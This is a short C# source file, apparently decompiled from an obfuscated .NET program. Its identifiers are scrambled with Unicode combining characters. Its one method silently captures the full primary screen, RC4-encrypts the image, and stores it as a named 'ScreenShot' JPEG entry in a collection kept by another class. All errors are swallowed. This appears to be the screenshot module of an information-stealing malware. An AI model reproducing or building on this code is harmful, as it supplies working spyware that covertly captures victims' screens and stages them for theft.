using System;
using System.Drawing;
using System.Windows.Forms;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000094 RID: 148
	internal class Class_114
	{
		// Token: 0x060002F3 RID: 755 RVA: 0x000162A0 File Offset: 0x000144A0
		public static void cmethod_414(string str_0)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				Bitmap bitmap = new Bitmap(width, height);
				Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				byte[] data = Class_114.vmethod_415(bitmap);
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\ScreenShot_" + Class_47.\u0367\u0309\u036F\u0320\u0340\u036A\u0332\u0020\u0317\u0020\u032C\u034F\u0020\u0E47\u033D\u0331tsitznjoxugionih\u033E\u035C\u0314\u035D\u0020\u0334\u0353\u0318\u035E\u0315\u035D\u036C\u030C\u0346\u0306\u0316tcqobbemddgicxmi + ".Jpeg", Class_47.RC4(data));
			}
			catch
			{
			}
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x00016340 File Offset: 0x00014540
		public static byte[] vmethod_415(Image arg_0)
		{
			return (byte[])new ImageConverter().ConvertTo(arg_0, typeof(byte[]));
		}
	}
}
